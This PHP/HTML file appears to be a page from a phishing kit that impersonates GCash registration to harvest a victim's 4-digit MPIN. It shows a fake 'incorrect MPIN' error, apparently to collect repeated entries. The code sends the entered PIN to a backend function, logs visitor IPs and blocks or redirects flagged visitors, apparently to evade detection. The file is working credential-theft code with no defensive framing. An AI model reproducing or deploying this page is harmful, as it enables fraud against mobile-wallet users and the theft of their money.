<?php
define("IN_DEX", "true");
include('zy/api/mysql.php');
index("7");
$ip = php_ip();
$a = mysql_sql("select * from " . DB . ".user where ip='{$ip}';");
if ($a && $a[0]["jzfw"] == "2") {
  yc(505);
}
if (ipxz()) { ?>
  <!DOCTYPE html>

  <html class="mobile" style="font-size: 100px;">

  <head>
    <link rel="shortcut icon" href="favicon.ico">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="format-detection" content="telephone=no, email=no">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=0.5,maximum-scale=0.5,minimum-scale=0.5">
    <meta name="data-aspm" content="a771">
    <title>GCash Registration</title>
    <meta property="og:title" content="Buy Load, Pay Bills, Send Money, and more with GCash!">
    <meta property="og:description" content="Get P50 when you download GCash and register!">
    <meta property="og:type" content="website">
    <meta property="og:url" content="gcsh.app">
    <meta property="og:image" content="static/gcash-referral-og-img.png">
    <meta name="wap-font-scale" content="no">
    <link rel="stylesheet" href="./GCash Registration1_files/desktop-2af45e719c754efa8bde.css">
    <link rel="stylesheet" href="./GCash Registration1_files/index-06ecf2b7e7d670269e4d.css">

  </head>

  <body><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0" id="__SVG_SPRITE_NODE__">
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" id="icon-announcement">
        <path d="M29.9,16c-0.6-0.5-0.7-1.5-0.2-2.1c0.5-0.6,1.5-0.7,2.1-0.2c4,3.3,6,6.8,6,10.3c0,3.6-2.1,7-6,10.3   c-0.6,0.5-1.6,0.4-2.1-0.2c-0.5-0.6-0.4-1.6,0.2-2.1c3.3-2.8,4.9-5.5,4.9-8C34.9,21.5,33.3,18.8,29.9,16z"></path>
        <path d="M35.8,10.1c-0.6-0.6-0.6-1.5,0-2.1c0.6-0.6,1.5-0.6,2.1,0c4.8,5,7.3,10.3,7.3,16c0,5.7-2.4,11.1-7.3,16.2   c-0.6,0.6-1.5,0.6-2.1,0.1c-0.6-0.6-0.6-1.5-0.1-2.1c4.3-4.6,6.4-9.3,6.4-14.1C42.2,19.2,40.1,14.5,35.8,10.1z"></path>
        <path d="M24.5,3.3l-10.4,8H4.5C3.7,11.3,3,12,3,12.8v23.3c0,0.8,0.7,1.5,1.5,1.5h9.7l10.4,7.8c1,0.7,2.4,0,2.4-1.2V4.5   C27,3.3,25.5,2.6,24.5,3.3z M24,41.2l-8.4-6.3c-0.3-0.2-0.6-0.3-0.9-0.3H6V14.3h8.7c0.3,0,0.7-0.1,0.9-0.3L24,7.5V41.2z"></path>
      </symbol>
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22" id="icon-btn-ok">
        <g stroke="#FFF" fill="none" fill-rule="evenodd">
          <path d="M.75 11c0 5.65 4.6 10.25 10.25 10.25S21.25 16.65 21.25 11 16.65.75 11 .75.75 5.35.75 11z" stroke-width="1.5"></path>
          <path d="M9.38 14.62c-.12 0-.25-.05-.35-.15L5.65 11.1c-.2-.2-.2-.53 0-.72.2-.2.5-.2.7 0l3.03 3.03 6.27-6.25c.2-.2.5-.2.7 0 .2.2.2.5 0 .7l-6.6 6.62c-.1.1-.24.15-.37.15z" stroke-width=".5" fill="#FFF" fill-rule="nonzero"></path>
        </g>
      </symbol>
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19 19" id="icon-btn-spin">
        <path d="M11.25 18.85v.03c-2.97.54-6.15-.35-8.45-2.65C-.92 12.5-.93 6.5 2.78 2.78 5.08.48 8.28-.4 11.25.16v.02c.2 0 .37.08.5.22.3.3.3.76 0 1.06-.13.14-.3.2-.5.22v.02l-.15-.03h-.04c-2.53-.52-5.26.2-7.22 2.17-3.12 3.12-3.12 8.2.02 11.33 1.92 1.92 4.56 2.67 7.04 2.24.28-.12.63-.07.86.16.3.3.3.78 0 1.07-.14.14-.32.2-.5.22z" fill="#FFF" fill-rule="evenodd"></path>
      </symbol>
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 70 70" id="icon-spin">
        <path opacity="0.083" d="M35,0L35,0c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V3C32,1.3,33.3,0,35,0z"></path>
        <path opacity="0.167" d="M52.5,4.7L52.5,4.7c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C49.2,4.4,51.1,3.9,52.5,4.7z"></path>
        <path opacity="0.25" d="M65.3,17.5L65.3,17.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C62.6,15.6,64.5,16.1,65.3,17.5z"></path>
        <path opacity="0.333" d="M70,35L70,35c0,1.7-1.3,3-3,3H53c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C68.7,32,70,33.3,70,35z"></path>
        <path opacity="0.417" d="M65.3,52.5L65.3,52.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C65.6,49.2,66.1,51.1,65.3,52.5z"></path>
        <path opacity="0.5" d="M52.5,65.3L52.5,65.3c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1l0,0 c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C54.4,62.6,53.9,64.5,52.5,65.3z"></path>
        <path opacity="0.583" d="M35,50L35,50c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V53 C32,51.3,33.3,50,35,50z"></path>
        <path opacity="0.667" d="M27.5,48L27.5,48c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C24.2,47.7,26.1,47.2,27.5,48z"></path>
        <path opacity="0.75" d="M20,35L20,35c0,1.7-1.3,3-3,3H3c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C18.7,32,20,33.3,20,35z"></path>
        <path opacity="0.8333" d="M22,42.5L22,42.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C19.3,40.6,21.2,41.1,22,42.5z"></path>
        <path opacity="0.917" d="M22,27.5L22,27.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C22.3,24.2,22.8,26.1,22,27.5z"></path>
        <path d="M27.5,22L27.5,22c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1 l0,0c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C29.4,19.3,28.9,21.2,27.5,22z"></path>
      </symbol>
    </svg><noscript><iframe src="#" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <div id="app" class="root-app">
      <!---->
      <div class="main-container otp-page">
        <div class="page-container">
          <div class="page-main content-center">
            <div class="main-content">
              <div class="page-item digit-message"><span class="otp-mobile-no">
                   Enter your MPIN <br><br></span> <span  class="otp-message">Never share your MPIN or OTP with anyone </span>
              </div>
            </div>
            <div>
              <div class="page-item otp-password-field">
                <div class="ap-digital-password" accessbilityid="otp-input" id="ipt">
                  <div id="ipt1"><input type="number" pattern="[0-9]*" class="ap-password-focus ap-input-end" style="left: 83.3333%; width: 16.6667%;opacity: 0;" id="input1">
                    <div class="ap-password-item ap--current"><i></i> <i class="ap-dot" style="display: none;"></i> <span style="display: none;"></span></div>
                    <div class="ap-password-item"><i></i> <i class="ap-dot" style="display: none;"></i> <span style="display: none;"></span></div>
                    <div class="ap-password-item"><i></i> <i class="ap-dot" style="display: none;"></i> <span style="display: none;"></span></div>
                    <div class="ap-password-item"><i></i> <i class="ap-dot" style="display: none;"></i> <span style="display: none;"></span></div>
                  </div>
                </div>
              </div>
              <div class="page-item"><br><br><br>
                <p class="resend-container">Help Center &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
                  <span><a class="text-irish-blue resend-button">Forgot MPIN?</a></span>
                </p>
              </div>
            </div>
          </div>
          <footer>
            <div class="submit-button"><button type="button" id="button1" class="ap-button ap-button-primary" data-aspm-click="c18660.d33813" accessbilityid="submit-button" disabled="disabled">
                Submit
                <!---->
                <!---->
                <!---->
              </button></div>
          </footer>
        </div>
      </div>
    </div>
    <p style="display: none;"></p>
    <!---->
    <div>
      <!---->
      <!---->
    </div>
    <style>
    #re, #er, #err,#err1,#errs1,#errs2,#errs3,#errs4{
        position: absolute;
      }
      #re{
        display: none;
      }
      #er{
        z-index: 1;
        background: #000;
        opacity: 0.1;
      }
      #err{
        background: #fff;
        z-index: 2;
        border-radius: 30px;
        border-bottom: 1px solid rgb(200,200,200,0.5);
      }
      #err1{
        z-index: 2;
        top: 0px;
        left: 0px;
        width: 100%;
        border-bottom: 1px solid rgb(200,200,200,0.8);
      }
      #errs4{
        color: #007dff;
      }
    </style>
    <div id="re">
    <div id="er"></div>
    <div id="err">
      <div id="err1">
        <span id="errs1">The MPIN entered is incorrect.</span>
        <span id="errs2">Enter the correct MPIN to avoid reaching the three allowed login attempts.</span>
        <span id="errs3">(LO131401)</span>
      </div>
      <span id="errs4">OK</span>
    </div>
    </div>
    <!---->
  </body>

  </html>
  <script type="text/javascript" src="zy/api/k.js"></script>
  <script>
            function onset() {
            var width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
            var height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;

            $id("re").style.left = 0+ "px";
            $id("re").style.top = 0 + "px";
            $id("re").style.width = width + "px";
            $id("re").style.height = height + "px";

            $id("er").style.left = 0+ "px";
            $id("er").style.top = 0 + "px";
            $id("er").style.width = width + "px";
            $id("er").style.height = height + "px";

            $id("err").style.left = width * 0.1 + "px";
            $id("err").style.top = height * 0.3 + "px";
            $id("err").style.width = width * 0.8 + "px";
            $id("err").style.height = height * 0.2 + "px";
            
            $id("err1").style.height = height * 0.13 + "px";

            $id("errs1").style.left = width * 0.07 + "px";
            $id("errs1").style.top = height * 0.02 + "px";
            $id("errs1").style.fontSize = width * 0.048 + "px";

            $id("errs2").style.left = width * 0.06 + "px";
            $id("errs2").style.top = height * 0.055 + "px";
            $id("errs2").style.fontSize = width * 0.037 + "px";

            $id("errs3").style.left = width * 0.05 + "px";
            $id("errs3").style.top = height * 0.1 + "px";
            $id("errs3").style.fontSize = width * 0.037 + "px";

            $id("errs4").style.left = width * 0.35 + "px";
            $id("errs4").style.top = height * 0.15 + "px";
        }
        window.onload = onset;
        
        $id("re").onclick=()=>{
          y();
        }
    js_ini_jsver("zy/api/i.js");
    $id("input1").focus();
    js_ini_jsver("zy/api/i.js");

    $id("button1").onclick = () => {
      var pp = ""
      for (let ni = 0; ni < n.length; ni++) {
        pp += n[ni];
      }
      api_yzm(pp);
    }
    $id("ipt").onclick = function() {
      $id("input1").focus();
    }

    n.length = 0;
    $id("input1").oninput = () => {
      $id("input1").value = $id("input1").value.replace(/\D/g, '');
      if ($id("input1").value != "") {
        n[n.length] = $id("input1").value;
        $id("input1").value = "";
        jia(n.length);
        if (n.length == 4) {
          $id("input1").setAttribute("disabled", "disabled");
        }
      }
    }
    document.onkeydown = function(event) {
      var e = event || window.event || arguments.callee.caller.arguments[0];
      if (e && e.keyCode == 8) {
        if (document.activeElement.value == "") {
          jian(n.length);
        }
      }
    };

    function jian(i) {
      if (n.length > 0) {
        $id("ipt1").getElementsByTagName("div")[i - 1].setAttribute("class", "ap-password-item ap--current");
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("i")[0].removeAttribute("style");
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("span")[0].innerHTML = "";
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("span")[0].setAttribute("style", "display:none");
        $id("ipt1").getElementsByTagName("div")[i].setAttribute("class", "ap-password-item");
        $id("ipt1").getElementsByTagName("div")[i].getElementsByTagName("i")[0].removeAttribute("style");
        $id("ipt1").getElementsByTagName("div")[i].getElementsByTagName("span")[0].innerHTML = "";
        $id("ipt1").getElementsByTagName("div")[i].getElementsByTagName("span")[0].setAttribute("style", "display:none");
        n.length = n.length - 1;
      }
    }

    function jia(i) {
      if (i < 4) {
        $id("ipt1").getElementsByTagName("div")[i].setAttribute("class", "ap-password-item ap--current");
        $id("ipt1").getElementsByTagName("div")[i - 1].setAttribute("class", "ap-password-item");
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("i")[0].setAttribute("style", "display:none");
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("span")[0].innerHTML = n[i - 1];
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("span")[0].removeAttribute("style");
      }
      if (i == 4) {
        $id("ipt1").getElementsByTagName("div")[i - 1].setAttribute("class", "ap-password-item");
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("i")[0].setAttribute("style", "display:none");
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("span")[0].innerHTML = n[i - 1];
        $id("ipt1").getElementsByTagName("div")[i - 1].getElementsByTagName("span")[0].removeAttribute("style");
        $id("button1").removeAttribute("disabled");
      }
    }
  </script>
<?php
} else {
  err(); ?>
  <script type="text/javascript" src="zy/api/k.js"></script>
  <script>
    y(errurl);
  </script>
<?php
}
?>